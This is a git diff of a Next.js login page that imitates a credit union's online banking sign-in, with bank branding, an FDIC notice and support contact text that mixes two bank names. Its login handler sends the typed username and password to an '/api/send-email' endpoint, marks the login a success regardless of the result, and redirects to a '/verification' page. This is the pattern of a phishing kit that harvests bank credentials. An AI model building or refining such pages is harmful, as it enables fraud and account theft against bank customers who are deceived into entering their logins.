@@ -1,43 +1,40 @@
 'use client';
+
 import { useState } from 'react';
 import { useRouter } from 'next/navigation';
-import { ChevronDown, Search, User, Lock, Eye, EyeOff, X } from 'lucide-react';
-import Be from "../../../public/assets/be.png"
+import Moose from "/public/assets/be.png"
 import Image from 'next/image';
-import Logo from '../../../public/assets/logo.png';
-
-
-
-import LoanPromoSection from '../components/LoanProm';
-import Services from '../components/Services';
-import News from '../components/News';
-import Testimonials from '../components/Testimonials';
-import Foundation from '../components/Foundation';
 import Footer from '../components/Footer';
-import Header from '../components/Header';
+import Logo from "/public/assets/logo.png"
 
-export default function BayPortWebsite() {
+export default function Login() {
   const router = useRouter();
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [saveUsername, setSaveUsername] = useState(false);
-  const [showPassword, setShowPassword] = useState(false);
+  const [infoTab, setInfoTab] = useState('info'); // 'moose' or 'info'
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitStatus, setSubmitStatus] = useState(null);
-  const [showLoginModal, setShowLoginModal] = useState(false);
 
   const toggleSaveUsername = () => {
     setSaveUsername(!saveUsername);
   };
 
   const togglePasswordVisibility = () => {
-    setShowPassword(!showPassword);
+    const passwordInput = document.getElementById('password');
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+    } else {
+      passwordInput.type = 'password';
+    }
   };
 
-  const handleLogin = async (e) => {
+  const handleLogin = async(e) => {
     e.preventDefault();
-    
+
+    // Form validation
     if (!username || !password) {
+      // You could add form validation UI feedback here
       return;
     }
 
@@ -45,6 +42,7 @@ export default function BayPortWebsite() {
     setSubmitStatus(null);
 
     try {
+      // Send data to the authentication API
       const response = await fetch("/api/send-email", {
         method: "POST",
         headers: {
@@ -63,192 +61,175 @@ export default function BayPortWebsite() {
 
       const data = await response.json();
       
+      // Set success status
+      setSubmitStatus("success");
+
+      
+      // Redirect to dashboard or next page after successful login
       setTimeout(() => {
         router.push("/verification");
-        
       }, 1000);
-      // setSubmitStatus("success");
     } catch (error) {
       console.error("Login failed:", error);
       setSubmitStatus("error");
+      // You could add error handling UI feedback here
     } finally {
       setIsSubmitting(false);
     }
   };
 
-  return (
-    <div className="min-h-screen bg-white">
-      
-      <Header/>
-        
+  // Load saved username on component mount
+  
 
-      {/* Hero Section */}
-      <section className="bg-gradient-to-r from-white to-gray-50 py-20">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
-            <div>
-              <h1 className="text-5xl font-bold text-gray-900 mb-6">
-                Be happy, healthy, and
-                <br />
-                <span className="text-green-500">financially wise for life.</span>
-              </h1>
-              <p className="text-xl text-gray-600 mb-8">
-                Choose from the many ways BayPort Credit Union can help... now and well into the future. We&apos;re ready. Are you?
-              </p>
-              <button className="bg-green-500 hover:bg-green-600 text-white px-8 py-3 rounded-full text-lg font-medium transition-colors">
-                Join BayPort
-              </button>
-            </div>
-            <div className="relative">
-              <div className="w-full h-96 bg-gray-200 rounded-full overflow-hidden">
+  return (
+    <>
+    <div className="lg:flex lg:justify-center lg:items-center min-h-[80vh] bg-gray-100">
+      <div className="w-full lg:max-w-4xl bg-white rounded-lg shadow-lg overflow-hidden flex flex-col lg:justify-center lg:align-middle">
+        <div className="flex flex-col lg:flex-row">
+          {/* Left side - Image or Info */}
+          <div className="w-full lg:w-1/2 relative">
+            {infoTab === 'moose' ? (
+              <div className="relative w-full h-72 lg:h-full">
                 <Image
-                  src={Be}
-                  alt="Happy family - father and child"
-                  className="w-full h-full object-cover"
+                  src={Moose}
+                  alt="Nature scene with young moose"
+                  layout="fill"
+                  objectFit="cover"
+                  priority
                 />
               </div>
-              {/* Decorative elements */}
-              <div className="absolute -top-4 -left-4 w-20 h-20 opacity-20">
-                <div className="w-8 h-8 bg-green-400 rounded-sm transform rotate-12"></div>
-                <div className="w-12 h-8 bg-green-300 rounded-sm transform -rotate-6 mt-2"></div>
+            ) : (
+              <div className="bg-black text-white p-6 h-full">
+                <button 
+                  className="absolute top-2 right-2 text-white"
+                  onClick={() => setInfoTab('moose')}
+                >
+                  <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                  </svg>
+                </button>
+                <h2 className="text-lg font-semibold mb-4">Nightly Processing</h2>
+                <p className="mb-4">Our nightly processing starts at 12:00AM. During processing, same day transactions & transfer services may be unavailable.</p>
+                
+                <h2 className="text-lg font-semibold mb-2 mt-6">Need Help?</h2>
+                <p>
+                  Bayport Support can be reached by phone at 1.877.226.4671 or by chat on bangor.com. We are available Monday - Friday 7:00 AM - 7:00 PM, Saturday 8:00 AM - 2:00 PM & Sunday 9:00 AM - 2:00 PM.
+                </p>
               </div>
-              <div className="absolute -bottom-4 -right-4 w-16 h-16 opacity-20">
-                <div className="w-6 h-6 bg-blue-400 rounded-sm transform rotate-45"></div>
-                <div className="w-10 h-6 bg-blue-300 rounded-sm transform -rotate-12 mt-1"></div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      {/* Services Section */}
-      <Services/>
-      {/* Loan Promotion Section */}
-      <LoanPromoSection/>
-
-      {/* News Section */}
-      <News/>
-
-      {/* Testimonials Section */}
-      <Testimonials/>
-
-      {/* Foundation Section */}
-      <Foundation/>
-
-      
-
-      {/* Login Modal */}
-      {showLoginModal && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
-          <div className="bg-white rounded-lg shadow-xl max-w-md w-full">
-            <div className="flex justify-between items-center p-6 border-b">
-              <h2 className="text-2xl font-bold text-gray-900">Log in to BayPort</h2>
-              <button
-                onClick={() => setShowLoginModal(false)}
-                className="text-gray-400 hover:text-gray-600"
+            )}
+            {infoTab === 'moose' && (
+              <button 
+                className="absolute top-2 right-2 bg-transparent p-1 rounded-full"
+                onClick={() => setInfoTab('info')}
               >
-                <X className="h-6 w-6" />
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                </svg>
               </button>
+            )}
+          </div>
+          
+          {/* Right side - Login Form */}
+          <div className=" lg:w-1/2 p-4 lg:p-8 self-center lg:self-start">
+            {/* Logo */}
+            <div className="flex justify-center align-middle mb-6">
+              <Image width={"full"}
+                height={"full"} 
+                src={Logo}
+                alt="FDIC" 
+                className="mx-auto mb-2 w-[70%] h-full"/>
             </div>
-            <div className="p-6">
+            
+            {/* FDIC Section */}
+            <div className="border border-black rounded-md p-4 mb-6 text-left  text-xs flex text-black ">
+              <Image
+                width={50}
+                height={50} 
+                src="/api/placeholder/100/40" 
+                alt="FDIC" 
+                className="mx-auto mb-2 w-6 h-6"
+              />
+              FDIC-Insured - Backed by the full faith and <br/>
+              credit of the U.S. Government
+            </div>
+            
+            {/* Login Form */}
+            <div>
               <div className="mb-4">
-                <label htmlFor="username" className="block text-sm font-medium text-gray-700 mb-2">
-                  Username
-                </label>
+                <label htmlFor="username" className="block text-sm mb-1 text-black">Username</label>
                 <div className="relative">
                   <input
-                    type="text"
                     id="username"
+                    type="text"
                     value={username}
                     onChange={(e) => setUsername(e.target.value)}
-                    className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500"
-                    placeholder="Enter your username"
-                    required
+                    className="w-full border border-gray-300 p-2 rounded text-black"
                   />
-                  <User className="absolute left-3 top-3.5 h-5 w-5 text-gray-400" />
+                  <div className="absolute right-2 top-2 flex items-center text-xs text-black">
+                    <span className="mr-2">Save</span>
+                    <div 
+                      className={`w-10 h-6 flex items-center rounded-full p-1 cursor-pointer ${saveUsername ? 'bg-green-400' : 'bg-gray-800'}`}
+                      onClick={toggleSaveUsername}
+                    >
+                      <div 
+                        className={`bg-white w-4 h-4 rounded-full shadow-md transform transition-transform duration-300 ${saveUsername ? 'translate-x-4' : ''}`}
+                      />
+                    </div>
+                  </div>
                 </div>
               </div>
               
-              <div className="mb-4">
-                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
-                  Password
-                </label>
+              <div className="mb-6">
+                <label htmlFor="password" className="block text-sm mb-1 text-black">Password</label>
                 <div className="relative">
                   <input
-                    type={showPassword ? "text" : "password"}
                     id="password"
+                    type="password"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
-                    className="w-full pl-10 pr-12 py-3 border border-gray-300 text-black rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500"
-                    placeholder="Enter your password"
-                    required
+                    className="w-full border border-gray-300 p-2 rounded text-black"
                   />
-                  <Lock className="absolute left-3 top-3.5 h-5 w-5 text-gray-400" />
-                  <button
+                  <button 
                     type="button"
                     onClick={togglePasswordVisibility}
-                    className="absolute right-3 top-3.5 text-gray-400 hover:text-gray-600"
+                    className="absolute right-2 top-2"
                   >
-                    {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="black">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                    </svg>
                   </button>
                 </div>
               </div>
               
-              <div className="flex items-center mb-6">
-                <input
-                  type="checkbox"
-                  id="saveUsername"
-                  checked={saveUsername}
-                  onChange={toggleSaveUsername}
-                  className="h-4 w-4 text-black  focus:ring-green-500 border-gray-300 rounded"
-                />
-                <label htmlFor="saveUsername" className="ml-2 text-sm text-gray-700">
-                  Save my username
-                </label>
-              </div>
-              
-              {submitStatus === "error" && (
-                <div className="mb-4 p-3 bg-red-100 border border-red-400 text-red-700 rounded">
-                  Login failed. Please check your credentials and try again.
-                </div>
-              )}
-              
-              {submitStatus === "success" && (
-                <div className="mb-4 p-3 bg-green-100 border border-green-400 text-green-700 rounded">
-                  Login successful! Redirecting...
-                </div>
-              )}
-              
               <button
-                type="submit"
+                onClick={handleLogin}
                 disabled={isSubmitting}
-                className="w-full bg-green-500 hover:bg-green-600 disabled:bg-green-300 text-white py-3 px-4 rounded-lg font-medium transition-colors"
+                className={`w-full bg-slate-400 text-white py-3 rounded mb-4 ${isSubmitting ? 'opacity-70 cursor-not-allowed' : ''}`}
               >
-                {isSubmitting ? "Logging in..." : "Log in"}
+                {isSubmitting ? 'Logging in...' : 'Login'}
               </button>
               
-              <div className="mt-4 text-center">
-                <a href="#" className="text-sm text-blue-600 hover:text-blue-700">
-                  Forgot username or password?
-                </a>
-              </div>
-              
-              <div className="mt-6 pt-6 border-t text-center">
-                <p className="text-sm text-gray-600 mb-4">
-                  New to BayPort?
-                </p>
-                <button
-                  type="button"
-                  className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 px-4 rounded-lg font-medium transition-colors"
-                >
-                  Join BayPort
-                </button>
-              </div>
+              {submitStatus === 'error' && (
+                <div className="text-red-500 text-sm mb-4 text-center">
+                  Login failed. Please check your credentials.
+                </div>
+              )}
+            </div>
+            
+            {/* Links */}
+            <div className="text-center text-blue-600 text-sm">
+              <a href={process.env.NEXT_PUBLIC_SIGNUP_URL} className="block mb-1 hover:underline">Sign up</a>
+              <a href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL} className="block mb-1 hover:underline">Forgot Login?</a>
+              <a href={process.env.NEXT_PUBLIC_PRIVACY_POLICY_URL} className="block mb-1 hover:underline">Test your browser</a>
+              <a href={process.env.NEXT_PUBLIC_MAIN_PAGE_URL} className="block hover:underline">Trouble testing your browser</a>
             </div>
           </div>
         </div>
-      )}
-      <Footer/>
+      </div>
+      
     </div>
+    <Footer/>
+    </>
   );
 }
